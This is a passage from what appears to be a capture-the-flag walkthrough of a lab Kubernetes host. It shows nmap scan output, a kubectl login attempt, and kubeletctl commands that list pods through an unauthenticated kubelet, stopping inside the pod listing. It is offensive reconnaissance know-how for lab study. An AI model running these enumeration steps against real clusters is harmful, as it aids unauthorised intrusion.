+</span></span><span style="display:flex;"><span>|_    <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;kind&#34;</span>:<span style="color:#e6db74">&#34;Status&#34;</span>,<span style="color:#e6db74">&#34;apiVersion&#34;</span>:<span style="color:#e6db74">&#34;v1&#34;</span>,<span style="color:#e6db74">&#34;metadata&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#e6db74">&#34;status&#34;</span>:<span style="color:#e6db74">&#34;Failure&#34;</span>,<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;forbidden: User &#34;</span>system:anonymous<span style="color:#e6db74">&#34; cannot options path &#34;</span>/<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;reason&#34;</span>:<span style="color:#e6db74">&#34;Forbidden&#34;</span>,<span style="color:#e6db74">&#34;details&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#e6db74">&#34;code&#34;</span>:403<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>10249/tcp open  http             Golang net/http server <span style="color:#f92672">(</span>Go-IPFS json-rpc or InfluxDB API<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#e6db74">&#39;t have a title (text/plain; charset=utf-8).
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| tls-alpn: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   h2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_  http/1.1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_http-title: Site doesn&#39;</span>t have a title <span style="color:#f92672">(</span>text/plain; charset<span style="color:#f92672">=</span>utf-8<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>steamcloud@1689748929
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:steamcloud
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-07-19T05:42:09
+</span></span><span style="display:flex;"><span>|_Not valid after:  2024-07-18T05:42:09
+</span></span><span style="display:flex;"><span>10256/tcp open  http             Golang net/http server <span style="color:#f92672">(</span>Go-IPFS json-rpc or InfluxDB API<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/plain; charset<span style="color:#f92672">=</span>utf-8<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port8443-TCP:V<span style="color:#f92672">=</span>7.94%T<span style="color:#f92672">=</span>SSL%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>7/19%Time<span style="color:#f92672">=</span>64B896D2%P<span style="color:#f92672">=</span>x86_64-pc-linux-gn
+</span></span><span style="display:flex;"><span>SF:u%r<span style="color:#f92672">(</span>GetRequest,22F,<span style="color:#e6db74">&#34;HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x2080fe9
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:101-e58b-4ded-aafe-844858d7c769\r\nCache-Control:\x20no-cache,\x20priva
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:te\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20n
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:osniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x2070d21561-358b-4a05-8242-e6
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:105982b66c\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20053db608-66c1-4350-
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:b594-d92bacaf9737\r\nDate:\x20Thu,\x2020\x20Jul\x202023\x2002:07:14\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:GMT\r\nContent-Length:\x20185\r\n\r\n{\&#34;kind\&#34;:\&#34;Status\&#34;,\&#34;apiVersion\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&#34;</span>:<span style="color:#ae81ff">\&#34;</span>v1<span style="color:#ae81ff">\&#34;</span>,<span style="color:#ae81ff">\&#34;</span>metadata<span style="color:#ae81ff">\&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#ae81ff">\&#34;</span>status<span style="color:#ae81ff">\&#34;</span>:<span style="color:#ae81ff">\&#34;</span>Failure<span style="color:#ae81ff">\&#34;</span>,<span style="color:#ae81ff">\&#34;</span>message<span style="color:#ae81ff">\&#34;</span>:<span style="color:#ae81ff">\&#34;</span>forbidden
+</span></span><span style="display:flex;"><span>SF::<span style="color:#ae81ff">\x</span>20User<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\\\&#34;</span>system:anonymous<span style="color:#ae81ff">\\\&#34;\x</span>20cannot<span style="color:#ae81ff">\x</span>20get<span style="color:#ae81ff">\x</span>20path<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\\\&#34;</span>/
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\\\&#34;\&#34;</span>,<span style="color:#ae81ff">\&#34;</span>reason<span style="color:#ae81ff">\&#34;</span>:<span style="color:#ae81ff">\&#34;</span>Forbidden<span style="color:#ae81ff">\&#34;</span>,<span style="color:#ae81ff">\&#34;</span>details<span style="color:#ae81ff">\&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#ae81ff">\&#34;</span>code<span style="color:#ae81ff">\&#34;</span>:403<span style="color:#f92672">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;)%r(HTTP
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:Options,233,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\x</span>20403<span style="color:#ae81ff">\x</span>20Forbidden<span style="color:#ae81ff">\r\n</span>Audit-Id:<span style="color:#ae81ff">\x</span>207844aecb-375
+</span></span><span style="display:flex;"><span>SF:2-4cb0-b356-d1a1e77b6817<span style="color:#ae81ff">\r\n</span>Cache-Control:<span style="color:#ae81ff">\x</span>20no-cache,<span style="color:#ae81ff">\x</span>20private<span style="color:#ae81ff">\r\n</span>C
+</span></span><span style="display:flex;"><span>SF:ontent-Type:<span style="color:#ae81ff">\x</span>20application/json<span style="color:#ae81ff">\r\n</span>X-Content-Type-Options:<span style="color:#ae81ff">\x</span>20nosniff<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:r<span style="color:#ae81ff">\n</span>X-Kubernetes-Pf-Flowschema-Uid:<span style="color:#ae81ff">\x</span>2070d21561-358b-4a05-8242-e6105982b
+</span></span><span style="display:flex;"><span>SF:66c<span style="color:#ae81ff">\r\n</span>X-Kubernetes-Pf-Prioritylevel-Uid:<span style="color:#ae81ff">\x</span>20053db608-66c1-4350-b594-d9
+</span></span><span style="display:flex;"><span>SF:2bacaf9737<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Thu,<span style="color:#ae81ff">\x</span>2020<span style="color:#ae81ff">\x</span>20Jul<span style="color:#ae81ff">\x</span>202023<span style="color:#ae81ff">\x</span>2002:07:14<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>
+</span></span><span style="display:flex;"><span>SF:Content-Length:<span style="color:#ae81ff">\x</span>20189<span style="color:#ae81ff">\r\n\r\n</span><span style="color:#f92672">{</span><span style="color:#ae81ff">\&#34;</span>kind<span style="color:#ae81ff">\&#34;</span>:<span style="color:#ae81ff">\&#34;</span>Status<span style="color:#ae81ff">\&#34;</span>,<span style="color:#ae81ff">\&#34;</span>apiVersion<span style="color:#ae81ff">\&#34;</span>:<span style="color:#ae81ff">\&#34;</span>v1<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:<span style="color:#e6db74">&#34;,\&#34;metadata\&#34;:{},\&#34;status\&#34;:\&#34;Failure\&#34;,\&#34;message\&#34;:\&#34;forbidden:\x20Us
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:er\x20\\\&#34;system:anonymous\\\&#34;\x20cannot\x20options\x20path\x20\\\&#34;/\\\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&#34;</span><span style="color:#ae81ff">\&#34;</span>,<span style="color:#ae81ff">\&#34;</span>reason<span style="color:#ae81ff">\&#34;</span>:<span style="color:#ae81ff">\&#34;</span>Forbidden<span style="color:#ae81ff">\&#34;</span>,<span style="color:#ae81ff">\&#34;</span>details<span style="color:#ae81ff">\&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#ae81ff">\&#34;</span>code<span style="color:#ae81ff">\&#34;</span>:403<span style="color:#f92672">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;)%r(FourOhF
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ourRequest,24A,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\x</span>20403<span style="color:#ae81ff">\x</span>20Forbidden<span style="color:#ae81ff">\r\n</span>Audit-Id:<span style="color:#ae81ff">\x</span>20d09285cf-
+</span></span><span style="display:flex;"><span>SF:227e-4419-9b4d-705ed21c026e<span style="color:#ae81ff">\r\n</span>Cache-Control:<span style="color:#ae81ff">\x</span>20no-cache,<span style="color:#ae81ff">\x</span>20private<span style="color:#ae81ff">\r</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20application/json<span style="color:#ae81ff">\r\n</span>X-Content-Type-Options:<span style="color:#ae81ff">\x</span>20nosni
+</span></span><span style="display:flex;"><span>SF:ff<span style="color:#ae81ff">\r\n</span>X-Kubernetes-Pf-Flowschema-Uid:<span style="color:#ae81ff">\x</span>2070d21561-358b-4a05-8242-e61059
+</span></span><span style="display:flex;"><span>SF:82b66c<span style="color:#ae81ff">\r\n</span>X-Kubernetes-Pf-Prioritylevel-Uid:<span style="color:#ae81ff">\x</span>20053db608-66c1-4350-b594
+</span></span><span style="display:flex;"><span>SF:-d92bacaf9737<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Thu,<span style="color:#ae81ff">\x</span>2020<span style="color:#ae81ff">\x</span>20Jul<span style="color:#ae81ff">\x</span>202023<span style="color:#ae81ff">\x</span>2002:07:15<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:r<span style="color:#ae81ff">\n</span>Content-Length:<span style="color:#ae81ff">\x</span>20212<span style="color:#ae81ff">\r\n\r\n</span><span style="color:#f92672">{</span><span style="color:#ae81ff">\&#34;</span>kind<span style="color:#ae81ff">\&#34;</span>:<span style="color:#ae81ff">\&#34;</span>Status<span style="color:#ae81ff">\&#34;</span>,<span style="color:#ae81ff">\&#34;</span>apiVersion<span style="color:#ae81ff">\&#34;</span>:<span style="color:#ae81ff">\&#34;</span>
+</span></span><span style="display:flex;"><span>SF:v1<span style="color:#ae81ff">\&#34;</span>,<span style="color:#ae81ff">\&#34;</span>metadata<span style="color:#ae81ff">\&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#ae81ff">\&#34;</span>status<span style="color:#ae81ff">\&#34;</span>:<span style="color:#ae81ff">\&#34;</span>Failure<span style="color:#ae81ff">\&#34;</span>,<span style="color:#ae81ff">\&#34;</span>message<span style="color:#ae81ff">\&#34;</span>:<span style="color:#ae81ff">\&#34;</span>forbidden:<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>SF:0User<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\\\&#34;</span>system:anonymous<span style="color:#ae81ff">\\\&#34;\x</span>20cannot<span style="color:#ae81ff">\x</span>20get<span style="color:#ae81ff">\x</span>20path<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\\\&#34;</span>/nice
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20ports,/Trinity<span style="color:#ae81ff">\.</span>txt<span style="color:#ae81ff">\.</span>bak<span style="color:#ae81ff">\\\&#34;\&#34;</span>,<span style="color:#ae81ff">\&#34;</span>reason<span style="color:#ae81ff">\&#34;</span>:<span style="color:#ae81ff">\&#34;</span>Forbidden<span style="color:#ae81ff">\&#34;</span>,<span style="color:#ae81ff">\&#34;</span>details<span style="color:#ae81ff">\&#34;</span>
+</span></span><span style="display:flex;"><span>SF::<span style="color:#f92672">{}</span>,<span style="color:#ae81ff">\&#34;</span>code<span style="color:#ae81ff">\&#34;</span>:403<span style="color:#f92672">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Nmap done: 1 IP address (1 host up) scanned in 112.28 seconds
+</span></span></span></code></pre></div><p>According to the provided  <a href="https://kubernetes.io/docs/reference/ports-and-protocols/">Documentation</a>, , ports <code>2379</code> and <code>2380</code> are indeed associated with <code>Kubernetes</code>. Additionally, the ports that nmap identified as <code>InfluxDB</code> are also part of Kubernetes.</p>
+<p>Furthermore, TCP port 8443 serves as the <code>primary API server</code> for the <code>cluster</code>. This port is crucial for communication with the Kubernetes API server, which is a central component of the Kubernetes control plane. Through this API server, users and various Kubernetes components can interact with the <code>cluster</code> to manage and monitor resources, deploy applications, and perform other <code>administrative tasks</code>.</p>
+<h2 id="kubernetes">Kubernetes<a href="#kubernetes" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I have the option to install a tool such as <code>kubectl</code> (follow the instructions <a href="https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/">here</a>) and attempt to interact with it, but it will only request authentication.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ kubectl --server https://10.10.11.133:8443  get pod
+</span></span><span style="display:flex;"><span>Please enter Username: system
+</span></span><span style="display:flex;"><span>Please enter Password: Unable to connect to the server: x509: certificate signed by unknown authority
+</span></span></code></pre></div><p>A tool similar to <code>kubectl</code> for kubelets is called <code>kubeletctl</code> (available at <a href="https://github.com/cyberark/kubeletctl">kubeletctl GitHub repository</a>). Once I&rsquo;ve installed it following the instructions in the README, I will use the <code>pods</code> command to list all the pods present on the node. There are quite a few pods listed.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ./kubeletctl_linux_amd64 pods -s 10.10.11.133
+</span></span><span style="display:flex;"><span>┌────────────────────────────────────────────────────────────────────────────────┐
+</span></span><span style="display:flex;"><span>│                                Pods from Kubelet                               │
+</span></span><span style="display:flex;"><span>├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
+</span></span><span style="display:flex;"><span>│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
+</span></span><span style="display:flex;"><span>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+</span></span><span style="display:flex;"><span>│ <span style="color:#ae81ff">1</span> │ coredns-78fcd69978-bzvqz           │ kube-system │ coredns                 │
+</span></span><span style="display:flex;"><span>│   │                                    │             │                         │
+</span></span><span style="display:flex;"><span>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+</span></span><span style="display:flex;"><span>│ <span style="color:#ae81ff">2</span> │ nginx                              │ default     │ nginx                   │
+</span></span><span style="display:flex;"><span>│   │                                    │             │                         │
+</span></span><span style="display:flex;"><span>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+</span></span><span style="display:flex;"><span>│ <span style="color:#ae81ff">3</span> │ 0xdf-pod                           │ default     │ 0xdf-pod                │
+</span></span><span style="display:flex;"><span>│   │                                    │             │                         │
+</span></span><span style="display:flex;"><span>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+</span></span><span style="display:flex;"><span>│ <span style="color:#ae81ff">4</span> │ etcd-steamcloud                    │ kube-system │ etcd                    │
+</span></span><span style="display:flex;"><span>│   │                                    │             │                         │
+</span></span><span style="display:flex;"><span>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+</span></span><span style="display:flex;"><span>│ <span style="color:#ae81ff">5</span> │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
+</span></span><span style="display:flex;"><span>│   │                                    │             │                         │
+</span></span><span style="display:flex;"><span>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+</span></span><span style="display:flex;"><span>│ <span style="color:#ae81ff">6</span> │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
+</span></span><span style="display:flex;"><span>│   │                                    │             │                         │
+</span></span><span style="display:flex;"><span>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+</span></span><span style="display:flex;"><span>│ <span style="color:#ae81ff">7</span> │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
+</span></span><span style="display:flex;"><span>│   │                                    │             │                         │
+</span></span><span style="display:flex;"><span>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+</span></span><span style="display:flex;"><span>│ <span style="color:#ae81ff">8</span> │ storage-provisioner                │ kube-system │ storage-provisioner     │
+</span></span><span style="display:flex;"><span>│   │                                    │             │                         │
+</span></span><span style="display:flex;"><span>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+</span></span><span style="display:flex;"><span>│ <span style="color:#ae81ff">9</span> │ kube-proxy-nwx25                   │ kube-system │ kube-proxy              │
+</span></span><span style="display:flex;"><span>│   │                                    │             │                         │
+</span></span><span style="display:flex;"><span>└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘
+</span></span></code></pre></div><p>The <code>runningpods</code> command provides a plethora of <code>JSON data</code> regarding the currently active pods.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">┌──(kali㉿kali)-</span>[<span style="color:#960050;background-color:#1e0010">~</span>]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─$</span> <span style="color:#960050;background-color:#1e0010">./kubeletctl_linux_amd</span><span style="color:#ae81ff">64</span> <span style="color:#960050;background-color:#1e0010">runningpods</span> <span style="color:#960050;background-color:#1e0010">-s</span> <span style="color:#ae81ff">10.10</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#ae81ff">11.133</span>         
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;kind&#34;</span>: <span style="color:#e6db74">&#34;PodList&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;apiVersion&#34;</span>: <span style="color:#e6db74">&#34;v1&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;metadata&#34;</span>: {},
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;items&#34;</span>: [
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;metadata&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;nginx&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;namespace&#34;</span>: <span style="color:#e6db74">&#34;default&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;uid&#34;</span>: <span style="color:#e6db74">&#34;2badf965-5628-479e-9775-5e4442eb154a&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;creationTimestamp&#34;</span>: <span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span>      },
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;spec&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;containers&#34;</span>: [
+</span></span><span style="display:flex;"><span>          {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;nginx&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;image&#34;</span>: <span style="color:#e6db74">&#34;sha256:295c7be079025306c4f1d65997fcf7adb411c88f139ad1d34b537164aa060369&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;resources&#34;</span>: {}
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>      },
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;status&#34;</span>: {}
+</span></span><span style="display:flex;"><span>    }, 
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;metadata&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;storage-provisioner&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;namespace&#34;</span>: <span style="color:#e6db74">&#34;kube-system&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;uid&#34;</span>: <span style="color:#e6db74">&#34;4cf18c50-5cb2-41a5-91a0-bcad49e6d7e0&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;creationTimestamp&#34;</span>: <span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span>      },
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;spec&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;containers&#34;</span>: [
+</span></span><span style="display:flex;"><span>          {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;storage-provisioner&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;image&#34;</span>: <span style="color:#e6db74">&#34;sha256:6e38f40d628db3002f5617342c8872c935de530d867d0f709a2fbda1a302a562&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;resources&#34;</span>: {}
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>      },
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;status&#34;</span>: {}
+</span></span><span style="display:flex;"><span>    }, 
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;metadata&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;kube-scheduler-steamcloud&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;namespace&#34;</span>: <span style="color:#e6db74">&#34;kube-system&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;uid&#34;</span>: <span style="color:#e6db74">&#34;3232b72c69e9f8bf518a7d727d878b27&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;creationTimestamp&#34;</span>: <span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span>      },
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;spec&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;containers&#34;</span>: [
+</span></span><span style="display:flex;"><span>          {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;kube-scheduler&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;image&#34;</span>: <span style="color:#e6db74">&#34;sha256:0aa9c7e31d307d1012fb9e63c274f1110868709a2c39f770dd82120cd2b8fe0f&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;resources&#34;</span>: {}
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>      },
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;status&#34;</span>: {}
+</span></span><span style="display:flex;"><span>    }, 
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;metadata&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;kube-controller-manager-steamcloud&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;namespace&#34;</span>: <span style="color:#e6db74">&#34;kube-system&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;uid&#34;</span>: <span style="color:#e6db74">&#34;be2478237d1af444b624cb01f51f79c4&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;creationTimestamp&#34;</span>: <span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span>      },
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;spec&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;containers&#34;</span>: [
+</span></span><span style="display:flex;"><span>          {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;kube-controller-manager&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;image&#34;</span>: <span style="color:#e6db74">&#34;sha256:05c905cef780c060cdaad6bdb2be2d71a03c0b9cb8b7cc10c2f68a6d36abd30d&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;resources&#34;</span>: {}
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>      },
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;status&#34;</span>: {}
+</span></span><span style="display:flex;"><span>    }, 
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;metadata&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;0xdf-pod&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;namespace&#34;</span>: <span style="color:#e6db74">&#34;default&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;uid&#34;</span>: <span style="color:#e6db74">&#34;c7bdf3ab-4b8d-4c4e-b14e-54044b8c5a27&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;creationTimestamp&#34;</span>: <span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span>      },
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;spec&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;containers&#34;</span>: [
+</span></span><span style="display:flex;"><span>          {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;0xdf-pod&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;image&#34;</span>: <span style="color:#e6db74">&#34;sha256:295c7be079025306c4f1d65997fcf7adb411c88f139ad1d34b537164aa060369&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;resources&#34;</span>: {}
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>      },
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;status&#34;</span>: {}
+</span></span><span style="display:flex;"><span>    }, 
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;metadata&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;kube-proxy-nwx25&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;namespace&#34;</span>: <span style="color:#e6db74">&#34;kube-system&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;uid&#34;</span>: <span style="color:#e6db74">&#34;e1f6d721-a928-425e-9572-a84d67ab75a7&#34;</span>,
